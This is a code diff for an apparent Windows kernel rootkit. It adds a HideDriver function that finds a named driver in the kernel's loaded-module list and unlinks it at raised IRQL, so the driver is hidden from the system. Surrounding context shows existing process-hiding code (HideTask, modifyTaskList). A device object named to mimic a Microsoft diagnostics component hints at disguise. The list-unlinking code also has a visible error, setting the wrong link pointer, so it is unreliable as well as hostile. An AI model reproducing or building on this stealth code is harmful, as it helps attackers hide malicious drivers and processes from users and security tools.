@@ -9,6 +9,104 @@ PDRIVER_OBJECT DriverObjectRef;
 PDRIVER_OBJECT MSNetDiagDeviceObject;
 offset Offset;
 
+void LowerIRQL(KIRQL prev)
+{
+	KeLowerIrql(prev);
+	return;
+}
+
+KIRQL RaiseIRQL()
+{
+	KIRQL curr;
+	KIRQL prev;
+
+	curr = KeGetCurrentIrql();
+	prev = curr;
+	if (curr < DISPATCH_LEVEL) {
+		KeRaiseIrql(DISPATCH_LEVEL, &prev);
+	}
+	return prev;
+}
+
+void removeDriver(DRIVER_SECTION* currentDS)
+{
+	LIST_ENTRY* prevDS;
+	LIST_ENTRY* nextDS;
+	KIRQL irql;
+	PKDPC dpcPtr;
+	irql = RaiseIRQL();
+
+	prevDS = ((*currentDS).listEntry).Blink;
+	nextDS = ((*currentDS).listEntry).Flink;
+	(*prevDS).Flink = nextDS;
+	(*nextDS).Flink = prevDS;
+	((*currentDS).listEntry).Flink = (LIST_ENTRY*)currentDS;
+	((*currentDS).listEntry).Blink = (LIST_ENTRY*)currentDS;
+
+	LowerIRQL(irql);
+	return;
+}
+
+DRIVER_SECTION* getCurrentDriverSection()
+{
+	BYTE* object;
+	DRIVER_SECTION* driverSection;
+
+	object = (UCHAR*)DriverObjectRef;
+	driverSection = *((PDRIVER_SECTION*)((DWORD)object + OFFSET_DRIVERSECTION));
+	return driverSection;
+}
+
+void HideDriver(BYTE* driverName)
+{
+	ANSI_STRING aDriverName;
+	UNICODE_STRING uDriverName;
+	NTSTATUS retVal;
+	DRIVER_SECTION* currentDS;
+	DRIVER_SECTION* firstDS;
+	LONG match;
+
+	RtlInitAnsiString(&aDriverName, driverName);
+	retVal = RtlAnsiStringToUnicodeString(&uDriverName, &aDriverName, TRUE);
+	if (retVal != STATUS_SUCCESS) {
+		DBG_PRINT2("[HideDriver]: Unable to covert to (%s)", driverName);
+	}
+
+	currentDS = getCurrentDriverSection();
+	firstDS = currentDS;
+
+	match = RtlCompareUnicodeString
+	(
+		&uDriverName,
+		&((*currentDS).fileName),
+		TRUE
+	);
+	if (match == 0) {
+		removeDriver(currentDS);
+		return;
+	}
+
+	currentDS = (DRIVER_SECTION*)((*firstDS).listEntry).Flink;
+
+	while (((DWORD)currentDS) != ((DWORD)firstDS)) {
+		match = RtlCompareUnicodeString
+		(
+			&uDriverName,
+			&((*currentDS).fileName),
+			TRUE
+		);
+		if (match == 0) {
+			removeDriver(currentDS);
+			return;
+		}
+		currentDS = (DRIVER_SECTION*)((*currentDS).listEntry).Flink;
+	}
+
+	RtlFreeUnicodeString(&uDriverName);
+	DBG_PRINT2("[HideDriver]: Driver (%s) NOT found", driverName);
+	return;
+}
+
 BOOLEAN isOSSupported()
 {
 	return Offset.isSupported;
@@ -184,25 +282,6 @@ void modifyTaskList(DWORD pid)
 	DBG_PRINT2("    %d Tasks Listed\n", fuse);
 	DBG_PRINT2("modifyTaskList: No task found with PID=%d\n", pid);
 	return;
-}
-
-void LowerIRQL(KIRQL prev)
-{
-	KeLowerIrql(prev);
-	return;
-}
-
-KIRQL RaiseIRQL()
-{
-	KIRQL curr;
-	KIRQL prev;
-
-	curr = KeGetCurrentIrql();
-	prev = curr;
-	if (curr < DISPATCH_LEVEL) {
-		KeRaiseIrql(DISPATCH_LEVEL, &prev);
-	}
-	return prev;
 }
 
 void HideTask(DWORD* pid)
